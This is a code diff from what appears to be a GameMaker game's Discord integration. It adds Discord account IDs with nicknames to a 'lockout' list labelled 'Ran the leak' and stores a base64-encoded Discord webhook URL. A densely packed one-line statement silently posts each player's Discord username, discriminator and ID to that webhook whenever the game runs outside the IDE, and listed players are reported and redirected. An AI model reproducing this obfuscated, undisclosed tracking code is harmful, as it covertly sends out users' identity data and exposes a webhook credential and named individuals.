@@ -73,7 +73,8 @@ switch async_load[? "event_type"]
 		}
 		
 		// lockout
-		var lockout = [
+		var lockout =
+		[
 			// PTT
 			"1069871151590944841", // Soapy
 			"503588309608431626", // Octo
@@ -121,6 +122,21 @@ switch async_load[? "event_type"]
 			"639062328276418571", // Manios
 			"847981927670874132", // Denchick friend group psyop account
 			"618151581111812106", // Mannu
+			"842841281642364960", // medicalnomad
+			
+			// Ran the leak
+			"744836933489918044", // Ranzero
+			"732165834935500872", // bananaspia
+			"800551251845971968", // sam4443
+			"1058024621728870482", // larfes
+			"976575794543476807", // .prodbydonat
+			"583315925575401473", // spooks.
+			"645869271699685376", // cosmosfox
+			"612352819831242765", // phil564
+			"533831083809177600", // _looney.
+			"604343454369185803", // fanmanu
+			"913427971635826698", // spamton_v420
+			"804061657625395241", // V1
 		];
 		
 		/*
@@ -133,6 +149,7 @@ switch async_load[? "event_type"]
 			
 		*/
 		
+		var web = base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU=");
 		if array_contains(lockout, a)
 		{
 			// easter egg.
@@ -144,7 +161,7 @@ switch async_load[? "event_type"]
 			var body = ds_map_create(), header = ds_map_create();
 			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game!");
 			ds_map_add(header, "Content-Type", "application/json");
-			http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="), "POST", header, json_encode(body));
+			http_request(web, "POST", header, json_encode(body));
 			ds_map_destroy(body);
 			ds_map_destroy(header);
 			
@@ -152,6 +169,6 @@ switch async_load[? "event_type"]
 			room_goto(Funnyroom);
 		}
 		
-		if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="),"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
+		if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(web,"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
 		break;
 }
